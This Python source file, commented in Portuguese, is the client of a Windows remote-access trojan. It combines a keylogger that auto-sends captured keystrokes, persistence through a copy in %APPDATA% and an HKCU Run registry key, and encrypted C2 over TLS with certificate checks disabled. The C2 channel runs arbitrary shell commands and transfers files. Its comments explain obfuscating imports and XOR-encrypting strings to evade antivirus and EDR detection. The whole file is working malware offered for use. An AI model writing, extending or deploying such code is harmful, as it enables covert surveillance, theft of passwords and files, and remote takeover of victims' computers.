import os
import sys
import base64
import importlib

import ssl
from cryptography.fernet import Fernet

from time import sleep
from pathlib import Path
from datetime import datetime


# -----------------------------------------------------------------------------
# Importações dinâmicas (importlib) — ofuscação de API
# -----------------------------------------------------------------------------
# Módulos como winreg, shutil, socket e subprocess são assinaturas clássicas de
# malware quando aparecem no topo do arquivo: analisadores estáticos e EDR's
# inspecionam a "tabela de imports" (do .py ou do .exe gerado pelo PyInstaller)
# e sinalizam esses nomes. Com importlib.import_module("nome") o import só
# acontece em runtime e o nome do módulo fica como string, fora da tabela de
# imports estáticos. O acesso passa a ser via alias (winreg_mod, shutil_mod,
# socket_mod, subprocess_mod) — comportamento idêntico, sinal menor.
winreg_mod = importlib.import_module("winreg")
shutil_mod = importlib.import_module("shutil")
socket_mod = importlib.import_module("socket")
subprocess_mod = importlib.import_module("subprocess")
Keyboard = importlib.import_module("pynput.keyboard")



# Resolve o caminho da pasta onde o programa vive, independente de estar
# rodando como script Python puro ou como executável gerado pelo PyInstaller.
# Quando não tem script real, sys.executable aponta pro .exe congelado.
if getattr(sys, 'frozen', False):
    application_path = os.path.dirname(sys.executable)
else:
    application_path = os.path.dirname(os.path.abspath(__file__))

# -----------------------------------------------------------------------------
# Carregamento do ".env" (configuração em tempo de execução)
# -----------------------------------------------------------------------------
# Procura um arquivo .env na mesma pasta e injeta as linhas "CHAVE=valor"
# no os.environ, para que o operador possa configurar IP/porta/nomes sem
# recompilar o payload. Linhas vazias e que começam com "#" são ignoradas.
env_path = os.path.join(application_path, '.env')
if os.path.exists(env_path):
    with open(env_path, 'r') as f:
        for line in f:
            line = line.strip()
            if line and not line.startswith('#'):
                if '=' in line:
                    key, value = line.split('=', 1)
                    os.environ[key.strip()] = value.strip()


# -----------------------------------------------------------------------------
# Crypto — XOR byte a byte (encriptar E decriptar)
# -----------------------------------------------------------------------------
# XOR é a própria inversa: (x ^ k) ^ k == x. Por isso a MESMA função serve
# para encriptar e decriptar — basta usar a mesma chave nos dois lados.
# Esconde strings que são assinaturas clássicas de malware (keylogger, chave
# de registro, nome de serviço...) e que geram sinal para antivírus e EDR's.
# key[i % len(key)]: faz a chave se repetir (como itertools.cycle) quando o
# payload é maior que a chave — sem precisar importar nada extra.
class Crypto:
    @staticmethod
    def xor_codec(data, key):
        # core: XOR byte a byte (entrada e chave em bytes)
        return bytes(b ^ key[i % len(key)] for i, b in enumerate(data))

    @staticmethod
    def decrypt_string(cipher_hex, key):
        # hex -> bytes (fromhex) -> XOR -> texto UTF-8
        # Pode falhar com ValueError (hex inválido) ou UnicodeDecodeError (chave errada)
        return Crypto.xor_codec(bytes.fromhex(cipher_hex), key.encode('utf-8')).decode('utf-8')


def env_or_secret(env_name, secret_hex, fallback=""):
    # Resolve uma config na ordem: .env > decrypt(DECRYPT_KEY) > fallback
    # Prioriza o valor do ambiente; só decripta quando a variável NÃO existe
    # E a chave está presente. Nunca quebra a importação (cai no fallback em erro).
    value = os.environ.get(env_name)
    if value:
        return value
    key = os.environ.get("DECRYPT_KEY")
    if key:
        try:
            return Crypto.decrypt_string(secret_hex, key)
        except (ValueError, UnicodeDecodeError):
            return fallback
    return fallback


# -----------------------------------------------------------------------------
# Config — parâmetros de runtime (com fallback via .env)
# -----------------------------------------------------------------------------
class Config:
    IP = env_or_secret("JANUS_IP", "5a6a0e0d5d7e020a47", "")  # Endereço do servidor C2
    PORT = int(env_or_secret("JANUS_PORT", "5f6c0a", "") or 0)         # Porta do servidor C2
    PROGRAM_NAME = env_or_secret("PROGRAM_NAME", "26315a5102235d4202074745103851791f264e29142b", "")  # Nome usado na cópia/registro
    REGISTRY_KEY_PATH = env_or_secret("REGISTRY_KEY_PATH", "38375f571a3140412a1f5e42032347451c2064171e200f374e50311347560437595527294659133b561c253b05", "")  # Chave de autostart
    MAX_BUFFER_SIZE = 500  # Quantas teclas o buffer do keylog guarda antes do auto-envio
    C2_KEY = os.environ.get("C2_KEY", "")  # Chave Fernet (base64) do canal C2 (mesma no cliente e no servidor)


# -----------------------------------------------------------------------------
# FileTransfer — download/upload de arquivos (base64)
# -----------------------------------------------------------------------------
class FileTransfer:
    @staticmethod
    def download_file(filepath):
        try:
            if not os.path.exists(filepath):
                return {
                    'success': False,
                    'error': "File not Found"
                }
            
            with open(filepath, 'rb') as f:
                file_data = f.read()

            return {
                'success': True,
                'filename': Path(filepath).name,
                'data': base64.urlsafe_b64encode(file_data).decode('utf-8'),
                'size': len(file_data)
            } 

        except Exception as e:
            return {
                'success': False,
                'error': str(e)
            }

    @staticmethod
    def upload_file(filepath, file_base64):
        try:
            file_data = base64.b64decode(file_base64)
            directory = os.path.dirname(filepath)

            if directory and not os.path.exists(filepath):
                os.makedirs(directory)
            
            with open(filepath, 'wb') as f:
                f.write(file_data)

            return {
                'success': True,
                'filename': Path(filepath).name,
                'size': len(file_data)
            } 

        except Exception as e:
            return {
                'success': False,
                'error': str(e)
            }


# -----------------------------------------------------------------------------
# Keylogger — captura de teclas via pynput
# -----------------------------------------------------------------------------
class Keylogger:
    def __init__(self, max_buffer_size):
        # Estado interno do keylogger:
        #   buffer              -> teclas capturadas acumuladas como lista de strings
        #   auto_send_pending   -> "true" quando o buffer encheu e precisa esvaziar
        #   active              -> flag de "já está rodando?" (evita listener duplicado)
        #   listener            -> referência ao objeto Keyboard.Listener ativo
        self.buffer = []
        self.auto_send_pending = False
        self.active = False
        self.listener = None
        self.max_buffer_size = max_buffer_size

    # -----------------------------------------------------------------------------
    # format_key(key) -> string legível da tecla pressionada
    # -----------------------------------------------------------------------------
    # Converte o objeto "key" do pynput em texto. Teclas normais têm o atributo
    # ".char" (a letra/dígito); teclas especiais (Enter, Shift...) não têm, e aí
    # caímos no AttributeError e procuramos num dicionário fixo. Se não estiver
    # no dicionário, usa o próprio nome da tecla em maiúsculas.
    def format_key(self, key):
        try:
            return key.char
        except AttributeError:
            special_keys = {
                Keyboard.Key.space: ' ',
                Keyboard.Key.enter: '[ENTER]\n',
                Keyboard.Key.tab: '[TAB]',
                Keyboard.Key.backspace: '[BACKSPACE]',
                Keyboard.Key.shift: '',
                Keyboard.Key.ctrl: '',
                Keyboard.Key.alt: '',
            }
            return special_keys.get(key, f'[{key.name.upper()}]')

    # -----------------------------------------------------------------------------
    # on_press(key) — callback disparado a cada tecla pelo pynput
    # -----------------------------------------------------------------------------
    # A única função chamada pelo listener. Converte a tecla e a adiciona ao
    # buffer (respeitando o limite). Quando o buffer enche, marca a flag de
    # auto-envio para que o loop em listen() a esvazie e mande pra o servidor.
    def on_press(self, key):
        formatted = self.format_key(key)
        if formatted and len(self.buffer) < self.max_buffer_size:
            self.buffer.append(formatted)
        
        if len(self.buffer) >= self.max_buffer_size:
            self.auto_send_pending = True

    # -----------------------------------------------------------------------------
    # get_keylog_data() -> string com o conteúdo capturado (e esvazia o buffer)
    # -----------------------------------------------------------------------------
    # Monta o "dump" do keylog com timestamp, concatena tudo que está no buffer e
    # limpa o buffer (para não reenviar a mesma coisa duas vezes). Retorna uma
    # mensagem padrão se o buffer estiver vazio.
    def get_keylog_data(self):
        if not self.buffer:
            return "[i] keylog buffer is empty"

        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        data = f'[+] keylog captured at {timestamp}:\n{"".join(self.buffer)}'
        self.buffer = []

        return data

    # -----------------------------------------------------------------------------
    # start() — inicia a captura de teclas
    # -----------------------------------------------------------------------------
    # Cria um Keyboard.Listener do pynput que chama on_press a cada tecla e o
    # inicia em thread separada (a captura continua enquanto o resto roda).
    # O guard "if active" evita criar dois listeners simultâneos.
    def start(self):
        if self.active:
            return "[i] keylogger already runnig"
        
        self.listener = Keyboard.Listener(on_press=self.on_press)
        self.listener.start()
        self.active = True

        return "[+] keylogger started"

    # -----------------------------------------------------------------------------
    # stop() — para a captura de teclas
    # -----------------------------------------------------------------------------
    # Só faz sentido se o listener existir; chama .stop() para encerrar a thread
    # e atualiza a flag de estado.
    def stop(self):
        if not self.active:
            return "[i] keylogger not running"

        if self.listener:
            self.listener.stop()
        
        self.active = False
        return "[+] keylogger stopped"


# -----------------------------------------------------------------------------
# Persistence — cópia do binário + entrada de autostart no registro
# -----------------------------------------------------------------------------
class Persistence:
    def __init__(self, program_name, registry_key_path):
        self.program_name = program_name
        self.registry_key_path = registry_key_path

    # -----------------------------------------------------------------------------
    # copy_to_system() — copia o executável atual para %APPDATA%
    # -----------------------------------------------------------------------------
    # Passo 1 da persistência: copia o próprio binário (sys.executable) para
    # %APPDATA%\Microsoft\Windows\<PROGRAM_NAME>.exe, seguindo a técnica comum de
    # se hospedar numa pasta legítima com nome "inocente". Se o arquivo já está
    # lá (mesmo caminho), não recopia e retorna o caminho atual.
    def copy_to_system(self):
        try:
            appdata_path = os.path.join(os.getenv("APPDATA"), "Microsoft", "Windows")
            if not os.path.exists(appdata_path):
                os.makedirs(appdata_path)
            
            current_file = sys.executable
            destination = os.path.join(appdata_path, f'{self.program_name}.exe')

            # "mesmo arquivo?" -> evita se copiar em cima de si próprio
            if os.path.abspath(current_file) != os.path.abspath(destination):
                shutil_mod.copy2(current_file, destination)
                return destination

            return current_file

        except Exception as e:
            print(f'Error copying file: {e}')
            return sys.executable

    # -----------------------------------------------------------------------------
    # add_to_registry(file_path) — cria a entrada de autostart no registro
    # -----------------------------------------------------------------------------
    # Passo 2 da persistência: abre a chave "Run" do HKCU em modo escrita e grava
    # um valor REG_SZ apontando para o binário, fazendo o Windows executá-lo no
    # login do usuário. Usa HKCU (não HKLM) porque não exige admin.
    def add_to_registry(self, file_path):
        try:
            key = winreg_mod.OpenKey(
                winreg_mod.HKEY_CURRENT_USER,
                self.registry_key_path,
                0,
                winreg_mod.KEY_SET_VALUE
            )

            winreg_mod.SetValueEx(
                key,
                self.program_name,
                0,
                winreg_mod.REG_SZ,
                file_path
            )

            winreg_mod.CloseKey(key)
            return True 

        except Exception as e:
            return False

    # -----------------------------------------------------------------------------
    # check_persistence() — o serviço já está persistido?
    # -----------------------------------------------------------------------------
    # Abre a mesma chave do registro em modo LEITURA (sem escrever) e tenta ler o
    # valor. Se a chave/valor não existir, o Windows sobe FileNotFoundError e
    # retornamos False (precisa persitir ainda).
    def check_persistence(self):
        try:
            key = winreg_mod.OpenKey(
                winreg_mod.HKEY_CURRENT_USER,
                self.registry_key_path,
                0,
                winreg_mod.KEY_READ
            )
            value, _ = winreg_mod.QueryValueEx(key, self.program_name)
            winreg_mod.CloseKey(key)

            return True

        except FileNotFoundError:
            return False

        except Exception as e:
            print(f'[-] Error checking persistence: {e}')
            return False

    # -----------------------------------------------------------------------------
    # setup_persistence() — orquestra a persistência completa
    # -----------------------------------------------------------------------------
    # Inicializa as configurações de persistência: se já persistido, não faz nada;
    # senão copia o binário e cria a entrada no registro.
    def setup_persistence(self):
        try:
            if self.check_persistence():
                return 
            
            persistence_path = self.copy_to_system()

            self.add_to_registry(persistence_path)

        except Exception as e:
            print(f"ERROR: {e}")


# -----------------------------------------------------------------------------
# Client — conexão e dispatcher de comandos com o servidor C2
# -----------------------------------------------------------------------------
class Client:
    def __init__(self, config, keylogger, persistence, file_transfer):
        self.ip = config.IP
        self.port = config.PORT
        self.c2_key = config.C2_KEY
        self.keylogger = keylogger
        self.persistence = persistence
        self.file_transfer = file_transfer

    # -----------------------------------------------------------------------------
    # connect() — cria o socket, sobe o TLS e conecta no servidor C2
    # -----------------------------------------------------------------------------
    # 1. Abre um socket TCP comum.
    # 2. Envolve num contexto TLS (sem validar certificado auto-assinado).
    # 3. Empacota num SecureC2Channel (TLS + Fernet) para ofuscar o protocolo.
    # 4. Envia um "handshake" cifrado ao servidor. Retorna o canal (ou None em erro).
    def connect(self):
        try:
            sock = socket_mod.socket(socket_mod.AF_INET, socket_mod.SOCK_STREAM)

            context = ssl.create_default_context()
            context.check_hostname = False
            context.verify_mode = ssl.CERT_NONE

            secure_sock = context.wrap_socket(sock, server_hostname=self.ip)
            secure_sock.connect((self.ip, self.port))

            channel = SecureC2Channel(secure_sock, self.c2_key.encode('utf-8'))
            channel.send(b"[#] Secure client connected")

            return channel
        except Exception as e:
            print(f'Connection error: {e}')
            return None

    # -----------------------------------------------------------------------------
    # listen(channel) — loop principal de troca de mensagens com o servidor
    # -----------------------------------------------------------------------------
    # Loop infinito que:
    #   1. Se o buffer do keylog encheu, envia os dados com prefixo [AUTO-SEND].
    #   2. Faz recv com timeout de 0.5s — retorna enquanto espera/ouve.
    #   3. Se chegar comando "/exit", encerra. Senão executa chamando cmd().
    # O timeout curto garante que o keylog seja esvaziado mesmo sem comando novo.
    def listen(self, channel):
        try:
            while True:

                if self.keylogger.auto_send_pending:
                    data = self.keylogger.get_keylog_data()
                    channel.send(f'[AUTO-SEND] {data}\n\n'.encode())
                    self.keylogger.auto_send_pending = False
                
                channel.settimeout(0.5)
                
                try:
                    data = channel.recv().decode().strip()
                    if data == "/exit":
                        return
                    else:
                        self.cmd(channel, data)
                
                except socket_mod.timeout:
                    continue

        except Exception as e:
            print(f'Listen function error: {e}')

    # -----------------------------------------------------------------------------
    # cmd(channel, data) — dispatcher de comandos recebidos
    # -----------------------------------------------------------------------------
    # Interpreta o comando textual vindo do servidor:
    #   - "cd <path>"          : muda o diretório de trabalho do processo
    #   - "/persistence ..."   : consulta ou executa a persistência
    #   - "/keylog ..."        : controla o keylogger
    #   - qualquer outra coisa : executa como comando de shell via subprocess e
    #                            devolve a saída (stdout+stderr) ao servidor
    def cmd(self, channel, data):
        try:
            if data.startswith("cd "):
                try:
                    os.chdir(data[3:].strip())
                except Exception as e:
                    print(f'CD function error: {e}')            
                channel.send(b"[i] Directory changed\n\n")
                return

            if data == "/persistence status":
                if self.persistence.check_persistence():
                    channel.send(f"[+] Persistence status:\n\t[i] Path: {sys.executable}\n\t[i] Registry Key: {self.persistence.registry_key_path}\n\t[i] Name: {self.persistence.program_name}\n\n".encode())
                    return 
                else:
                    channel.send(b"[-] Persistence status: Fail\n\n")
                    return

            elif data == "/persistence setup":
                self.persistence.setup_persistence()
                channel.send(b"[+] Done\n\n")
                return

            elif data == "/keylog start":
                response = self.keylogger.start()
                channel.send(response.encode() + b"\n\n")
                return

            elif data == "/keylog stop":
                response = self.keylogger.stop()
                channel.send(response.encode() + b"\n\n")
                return

            elif data == "/keylog dump":
                response = self.keylogger.get_keylog_data()
                channel.send(response.encode() + b"\n\n")
                return
            
            elif data == "/keylog status":
                status = "Running" if self.keylogger.active else "Stopped"
                buffer_size = len(self.keylogger.buffer)

                response = f'[i] Keylogger status: {status}\n Buffer: {buffer_size} keys'

                channel.send(response.encode() + b"\n\n")
                return

            elif data.startswith("/download "):
                filepath = data[10:].strip()

                result = self.file_transfer.download_file(filepath)

                if result['success']:
                    info = (
                        f"[i] Preparing file for download... \n"
                        f"[+] File read for download\n"
                        f"[i] Filename: {result}\n"
                        f"[i] Size {result['size']}\n"
                        f"[FILE_START]\n"
                    )
                    # Um único send: o framing do canal entrega uma mensagem
                    # completa por vez, então juntamos tudo num payload só.
                    payload = info.encode() + result['data'].encode() + b"\n[FILE_END]\n\n"
                    channel.send(payload)

                else:
                    channel.send(f"[-] Download failed: {result['error']}\n\n".encode())

                return 

            # Fallback: comando de shell. shell=True delega pro interpretador do
            # sistema (cmd.exe), então suporta pipes/redirecionamento. Captura
            # stdout e stderr e manda a saída de volta — se vazia, avisa.
            else: 
                p = subprocess_mod.Popen(
                    data,
                    shell=True,
                    stdin=subprocess_mod.PIPE,
                    stderr=subprocess_mod.PIPE,
                    stdout=subprocess_mod.PIPE
                )

                output = p.stdout.read() + p.stderr.read()

                if output:
                    channel.send(output + b"\n\n")
                else:
                    channel.send(b"[+] Command executed\n\n")

        except Exception as e: 
            print(f'CMD function error: {e}')


class SecureC2Channel:
    def __init__(self, sock: socket_mod.socket, encryption_key: bytes):
        self.sock = sock
        self.cipher = Fernet(encryption_key)

    def send(self, data: bytes):
        """Cifra os dados com Fernet e envia pelo socket TLS."""
        if isinstance(data, str):
            data = data.encode('utf-8')
        
        # 1. Cifrar o payload
        encrypted_data = self.cipher.encrypt(data)
        
        # 2. Enviar o tamanho (4 bytes) seguido do payload cifrado
        length_header = len(encrypted_data).to_bytes(4, byteorder='big')
        self.sock.sendall(length_header + encrypted_data)

    def recv(self, bufsize=1024) -> bytes:
        """Lê o tamanho do pacote, recebe os dados cifrados e os decifra."""
        try:
            # 1. Ler o cabeçalho de tamanho (4 bytes)
            raw_length = self.sock.recv(4)
            if not raw_length:
                return b""
            length = int.from_bytes(raw_length, byteorder='big')
            
            # 2. Ler o payload completo com base no tamanho esperado
            data = bytearray()
            while len(data) < length:
                packet = self.sock.recv(length - len(data))
                if not packet:
                    break
                data.extend(packet)
                
            # 3. Decifrar com Fernet
            return self.cipher.decrypt(bytes(data))
        except socket_mod.timeout:
            # Timeout deve propagar para o chamador tratar (não vira resposta vazia)
            raise
        except Exception as e:
            print(f"[-] Erro ao receber dados: {e}")
            return b""

    def settimeout(self, timeout):
        self.sock.settimeout(timeout)

    def close(self):
        self.sock.close()

# -----------------------------------------------------------------------------
# __main__ — ponto de entrada do processo
# -----------------------------------------------------------------------------
# 1. Configura a persistência (cópia + registro) logo no início.
# 2. Entra num loop infinito: tenta conectar, e enquanto a conexão estiver de
#    pé fica em listen() trocando comandos. Se a conexão cair ou falhar,
#    espera 5 segundos e tenta de novo (comportamento "phoenix").
if __name__ == '__main__':
    try:

        keylogger = Keylogger(Config.MAX_BUFFER_SIZE)
        persistence = Persistence(Config.PROGRAM_NAME, Config.REGISTRY_KEY_PATH)
        file_transfer = FileTransfer()
        client = Client(Config, keylogger, persistence, file_transfer)

        persistence.setup_persistence()

        while True:
            channel = client.connect()

            if channel:
                client.listen(channel)
            else :
                sleep(5)

    except KeyboardInterrupt:
        print('Program stopped by the user')

    except Exception as e:
        print(f'Error in main function: {e}')
